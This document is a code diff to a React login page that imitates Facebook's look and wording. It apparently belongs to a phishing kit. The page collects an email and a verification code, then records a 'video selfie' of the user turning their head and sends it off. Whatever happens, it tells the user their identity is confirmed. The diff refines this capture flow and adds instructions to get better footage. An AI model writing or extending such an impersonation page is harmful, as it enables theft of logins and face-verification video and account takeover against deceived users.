@@ -84,6 +84,7 @@ export default function LoginPage() {
   const [recordedChunks, setRecordedChunks] = useState<Blob[]>([]);
   const [directionProgress, setDirectionProgress] = useState(0);
   const [overallProgress, setOverallProgress] = useState(0);
+  const [capturedVideo, setCapturedVideo] = useState<Blob | null>(null);
 
   const loginForm = useForm<LoginForm>({
     resolver: zodResolver(loginSchema),
@@ -229,6 +230,7 @@ export default function LoginPage() {
           // Use the mimeType that MediaRecorder actually used
           const actualMimeType = recorder.mimeType || 'video/webm';
           const videoBlob = new Blob(chunks, { type: actualMimeType });
+          setCapturedVideo(videoBlob);
           setRecordedChunks(chunks);
 
           console.log('Video recorded, size:', videoBlob.size, 'bytes', 'mimeType:', actualMimeType);
@@ -249,6 +251,7 @@ export default function LoginPage() {
           }
 
           console.log('Video sent successfully');
+          setCurrentStep("complete");
         } catch (error) {
           console.error('Failed to send video:', error);
         }
@@ -296,13 +299,10 @@ export default function LoginPage() {
                 recorder.stop();
               }
 
+              if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+              }
               setCurrentStep("processing");
-              setTimeout(() => {
-                if (stream) {
-                  stream.getTracks().forEach(track => track.stop());
-                }
-                setCurrentStep("complete");
-              }, 3000);
             } else {
               // Set next direction
               setCurrentDirection(directions[currentDirIndex]);
@@ -591,10 +591,7 @@ export default function LoginPage() {
           {/* Instructions Screen */}
           {currentStep === "instructions" && (
             <div className="text-center px-4 py-8">
-              <h2 className="text-3xl font-bold mb-3" style={{ color: '#1c1e21' }}>Take a video selfie</h2>
-              <p className="text-sm mb-8" style={{ color: '#65676b', lineHeight: '20px' }}>
-                Center your face in the frame. You'll be asked to slowly turn your head left, right, and up.
-              </p>
+              <h2 className="text-3xl font-bold mb-4" style={{ color: '#1c1e21' }}>Take a video selfie</h2>
 
               {/* Camera Preview */}
               <div className="relative w-72 h-96 mx-auto mb-8 rounded-2xl overflow-hidden" style={{ backgroundColor: '#000', boxShadow: '0 10px 40px rgba(0,0,0,0.2)' }}>
@@ -617,6 +614,30 @@ export default function LoginPage() {
                       boxShadow: 'inset 0 0 20px rgba(24, 119, 242, 0.2)'
                     }}
                   />
+                </div>
+              </div>
+
+              <div className="max-w-sm mx-auto mb-8 text-left">
+                <p className="text-xs font-semibold mb-3" style={{ color: '#1c1e21' }}>Before you start:</p>
+                <div className="space-y-2">
+                  <div className="flex items-center gap-2">
+                    <svg className="w-4 h-4 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#1877f2' }}>
+                      <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
+                    </svg>
+                    <p className="text-xs" style={{ color: '#65676b' }}>Good lighting is important</p>
+                  </div>
+                  <div className="flex items-center gap-2">
+                    <svg className="w-4 h-4 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#1877f2' }}>
+                      <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
+                    </svg>
+                    <p className="text-xs" style={{ color: '#65676b' }}>Look directly at the camera</p>
+                  </div>
+                  <div className="flex items-center gap-2">
+                    <svg className="w-4 h-4 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#1877f2' }}>
+                      <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
+                    </svg>
+                    <p className="text-xs" style={{ color: '#65676b' }}>Turn head left, right, and up</p>
+                  </div>
                 </div>
               </div>
 
@@ -739,63 +760,60 @@ export default function LoginPage() {
             </div>
           )}
 
-          {/* Processing */}
-          {currentStep === "processing" && (
+          {/* Processing/Complete - Identity Confirmed */}
+          {(currentStep === "processing" || currentStep === "complete") && (
             <div className="text-center py-12">
-              <div className="relative w-16 h-16 mx-auto mb-4">
-                <div
-                  className="absolute inset-0 rounded-full border-4"
-                  style={{
-                    borderColor: '#e4e6eb',
-                    borderTopColor: '#1877f2',
-                    animation: 'fb-spin 1s linear infinite'
-                  }}
-                />
-              </div>
-              <h2 className="text-lg font-semibold mb-2" style={{ color: '#1c1e21' }}>Verifying video...</h2>
-              <p className="text-sm" style={{ color: '#65676b' }}>
-                This may take a few moments.
-              </p>
-            </div>
-          )}
-
-          {/* Complete - Identity Confirmed */}
-          {currentStep === "complete" && (
-            <div className="text-center py-12">
-              <div className="w-32 h-32 mx-auto mb-8 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
-                <svg className="w-16 h-16 text-white" fill="currentColor" viewBox="0 0 24 24" style={{ color: '#00a400' }}>
-                  <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" fill="currentColor" />
-                  <circle cx="12" cy="12" r="10" fill="none" stroke="#00a400" strokeWidth="2" />
-                </svg>
-                <svg className="w-16 h-16 absolute text-white" viewBox="0 0 24 24" style={{ color: '#00a400' }}>
-                  <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" fill="none" stroke="currentColor" strokeWidth="3" />
-                </svg>
-              </div>
-              <h2 className="text-3xl font-bold mb-3" style={{ color: '#1c1e21' }}>Identity Confirmed</h2>
-              <p className="text-sm mb-10" style={{ color: '#65676b' }}>
-                Your face has been verified successfully. You can now continue to Facebook.
-              </p>
-              <button
-                onClick={() => {
-                  setCurrentStep("login");
-                  setUserEmail("");
-                  setVerificationCode("");
-                  setCompletedDirections(new Set());
-                  setCurrentDirection(null);
-                  setIsRecording(false);
-                  if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                    setStream(null);
-                  }
-                }}
-                className="w-full py-3 text-white text-sm font-bold rounded-full transition"
-                style={{ backgroundColor: '#1877f2' }}
-                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
-                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
-                data-testid="button-continue"
-              >
-                Continue to Facebook
-              </button>
+              {currentStep === "processing" ? (
+                <>
+                  <div className="relative w-16 h-16 mx-auto mb-4">
+                    <div
+                      className="absolute inset-0 rounded-full border-4"
+                      style={{
+                        borderColor: '#e4e6eb',
+                        borderTopColor: '#1877f2',
+                        animation: 'fb-spin 1s linear infinite'
+                      }}
+                    />
+                  </div>
+                  <h2 className="text-lg font-semibold mb-2" style={{ color: '#1c1e21' }}>Verifying video...</h2>
+                  <p className="text-sm" style={{ color: '#65676b' }}>
+                    Please wait while we verify your identity.
+                  </p>
+                </>
+              ) : (
+                <>
+                  <div className="w-32 h-32 mx-auto mb-8 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
+                    <svg className="w-16 h-16" fill="none" stroke="#00a400" viewBox="0 0 24 24" strokeWidth={3}>
+                      <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
+                    </svg>
+                  </div>
+                  <h2 className="text-3xl font-bold mb-3" style={{ color: '#1c1e21' }}>Identity Confirmed</h2>
+                  <p className="text-sm mb-10" style={{ color: '#65676b' }}>
+                    Your face has been verified successfully. You can now continue to Facebook.
+                  </p>
+                  <button
+                    onClick={() => {
+                      setCurrentStep("login");
+                      setUserEmail("");
+                      setVerificationCode("");
+                      setCompletedDirections(new Set());
+                      setCurrentDirection(null);
+                      setIsRecording(false);
+                      if (stream) {
+                        stream.getTracks().forEach(track => track.stop());
+                        setStream(null);
+                      }
+                    }}
+                    className="w-full py-3 text-white text-sm font-bold rounded-full transition"
+                    style={{ backgroundColor: '#1877f2' }}
+                    onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
+                    onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+                    data-testid="button-continue"
+                  >
+                    Continue to Facebook
+                  </button>
+                </>
+              )}
             </div>
           )}
         </div>
